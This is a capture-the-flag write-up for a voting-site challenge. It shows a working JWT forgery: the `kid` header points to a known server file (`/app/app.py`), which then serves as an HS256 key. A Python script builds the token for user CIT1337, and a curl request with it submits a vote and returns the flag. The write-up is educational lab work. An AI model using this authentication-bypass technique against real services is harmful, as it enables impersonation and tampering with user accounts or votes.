# The voting logs ain't making sense
Most people probably managed to solve this one, and probably solved it using the intended method, however I ended up solving this one before doing the intended method for *I can be anyone!* and then used the same method to solve both challenges. This is how I did *I can be anyone!* the hard way.
### What We Need
The objective of the challenge is to submit a vote for the "CIT1337" user. For *I can be anyone!* the intended method is to obtain a JWT for the "CIT100" user from the `/generate-qr` endpoint. This method doesn't work for the CIT1337 user as a vote has already been recorded in the database. I believe the intended method for this challenge is to use an algorithm switching attack using the JWT for the CIT100 user. Instead, as the `decode_jwt_token` function allows you to specify the public key path in the `kid` header, I used a known file on the server with a symmetric algorithm to encode my own JWT.
### Encoding a Custom Token
For the symmetric key file, I used a file we've been provided that should be the same on the server: the `app.py` file. We just need to read this file in, and use it as a key in the `jwt.encode` function, using the `HS256` algorithm. Our script will look like this:
```python
import jwt
import os
from datetime import datetime, timedelta

def create_jwt_token(citizen_id, name, state, key_path, key):
    payload = {
        "citizenId": citizen_id,
        "name": name,
        "state": state,
        "vote_identifier": os.urandom(32).hex(),
        "iat": int(datetime.now().timestamp()),
        "exp": int((datetime.now() + timedelta(hours=24)).timestamp())
    }

    headers = {"kid": key_path}

    token = jwt.encode(
        payload,
        key,
        algorithm="HS256",
        headers=headers
    )

    return token

# Path to app.py locally
with open('backend-codebase/app.py', "r") as key_file:
    key = key_file.read()

print(create_jwt_token("CIT1337", "Jane Doe", "Izzi", "/app/app.py", key))
```
Then we use the resulting JWT to call the `/submit-vote` endpoint:
```shell
$ curl http://mobile-app.commission.freedonia.vote/api/voting/submit-vote \
> -H "Content-Type: application/json" \
> -H "Authorization: Bearer <Your JWT>" \
> --data '{"party": "test party"}'
{"citizen_id":"CIT1337","message":"Vote submitted successfully","party":"test party","state":"Izzi","success":true,"the_voting_logs_aint_making_sense_flag":"cysea{you_got_to_be_KIDding_me}"}
```
You can also solve *I can be anyone!* by changing the CIT1337 value to CIT100 when generating the token, and submitting again using the new JWT.